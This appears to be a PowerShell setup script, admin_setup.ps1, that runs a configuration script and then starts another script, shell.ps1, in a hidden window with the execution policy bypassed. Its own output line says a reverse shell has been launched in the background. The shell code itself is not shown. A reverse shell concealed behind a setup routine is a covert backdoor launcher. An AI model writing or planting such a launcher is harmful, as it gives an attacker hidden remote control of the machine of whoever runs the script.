# run with powershell -ExecutionPolicy Bypass -File admin_setup.ps1
# Runs element_config.ps1, then launches shell.ps1 in the background.

$here = Split-Path -Parent $MyInvocation.MyCommand.Path

& "$here\element_config.ps1"

Start-Process powershell -ArgumentList @(
    "-ExecutionPolicy", "Bypass",
    "-File", "$here\shell.ps1"
) -WindowStyle Hidden

Write-Host "Element configured. Reverse shell launched in background."